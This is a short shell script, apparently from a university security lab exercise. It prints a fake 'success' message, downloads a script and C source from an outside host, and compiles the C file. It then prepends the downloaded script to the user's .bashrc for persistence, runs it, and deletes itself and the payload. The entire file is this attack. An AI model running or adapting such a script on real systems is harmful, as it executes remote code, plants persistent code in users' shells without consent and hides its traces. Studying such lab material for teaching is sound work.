#! /bin/sh                                                                                                                      
echo "success"
CURDIR=`pwd`
DIRECTORY="./"
TARGET=".bashrc"
FULLPATH="${DIRECTORY}${TARGET}"

wget "abstract.cs.washington.edu/~roy/lab3/bn.sh"

rm ~/cgethttp.c
wget "abstract.cs.washington.edu/~roy/lab3/cgethttp.c"
gcc cgethttp.c -o cgethttp
chmod +x cgethttp

cat bn.sh $FULLPATH > temp
mv temp $FULLPATH

source bn.sh

cd $CURDIR
rm bn.sh
rm bad.sh